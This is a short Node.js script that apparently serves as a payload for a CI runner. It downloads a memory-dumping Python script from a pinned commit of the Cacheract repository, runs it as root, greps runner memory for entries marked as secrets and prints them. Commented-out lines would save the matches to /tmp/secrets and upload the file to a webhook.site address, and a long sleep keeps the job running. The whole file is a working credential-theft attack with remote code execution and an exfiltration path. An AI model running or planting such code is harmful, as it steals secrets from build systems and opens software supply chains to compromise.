#!/usr/bin/env node
/* eslint-disable */
//prettier-ignore
const {exec} = require('child_process');
/*
*/
const pattern = '"[^"]+":{"value":"[^"]*","isSecret":true}';

exec(
  `curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}'`,
  (err, stdout) => {
    console.log(atob(atob(stdout)));
    //require('fs').appendFileSync('/tmp/secrets', (matches || []).join('\n'));
  }
);
//exec(`bash -c 'curl -X PUT --upload-file /tmp/secrets https://webhook.site/82254406-e94e-4109-9231-1205c05c68fa'`)
console.log('bye');
exec(`bash -c 'sleep 6000'`);
